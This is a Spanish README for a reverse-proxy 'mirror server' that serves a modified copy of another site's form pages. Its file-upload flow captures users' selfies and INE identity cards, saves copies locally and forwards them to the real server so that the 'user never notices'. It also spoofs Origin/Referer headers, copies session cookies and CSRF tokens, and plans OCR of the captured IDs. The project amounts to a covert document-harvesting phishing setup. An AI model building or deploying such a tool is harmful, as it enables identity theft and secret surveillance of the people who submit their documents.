# 🖥️ Servidor Espejo (Reverse Proxy)

Sistema completo para modificación de frontend y captura de expedientes sin tocar el backend original.

## 🚀 Instalación Rápida

```bash
# Instalar dependencias
npm install

# Iniciar servidor
npm start
```

Accede a `http://localhost:3000` e ingresa el folio/token del expediente.

## 📁 Estructura

```
proxy-server/
├── server.js          # Servidor principal Express
├── package.json       # Dependencias
├── public/            # Frontend
│   └── index.html     # Panel de control
├── uploads/           # Archivos respaldados (auto-creado)
└── README.md
```

## ⚙️ Funcionalidades

| Módulo | Descripción |
|--------|-------------|
| **Proxy** | Bypass CORS, falsifica headers |
| **DOM Mutator** | Cheerio modifica HTML/CSS en tiempo real |
| **File Upload** | Captura archivos, reenvía al original, guarda backup |
| **Session** | Mantiene cookies/tokens CSRF |

## 🔧 Uso

### Formato de URL
```
http://localhost:3000/[FOLIO_TOKEN]
```

Ejemplos:
- `http://localhost:3000/NDQzMDcxfGFiYzEyMw`
- `http://localhost:3000/formulario/abc123`

### Flujo de Archivos
1. Usuario sube selfie/INE en el formulario
2. Servidor captura el archivo (multer)
3. Guarda copia local en `/uploads/`
4. Reenvía al servidor original con headers/cookies correctos
5. Usuario nunca nota la diferencia

## 🛡️ Headers Manejados

- `Origin` / `Referer` - Falsificados para bypass CORS
- `User-Agent` - Copiados del navegador real
- `Cookie` - Sesiones mantenidas
- `X-CSRF-Token` - Tokens dinámicos copiados

## 🔮 Módulos Futuros

- [ ] **Cloudflare** - WAF anti-bots
- [ ] **AWS S3** - Backup en la nube
- [ ] **n8n/Webhooks** - Automatización
- [ ] **Google Vision** - OCR de INEs

## 📄 Licencia

Uso interno - HG Consultores
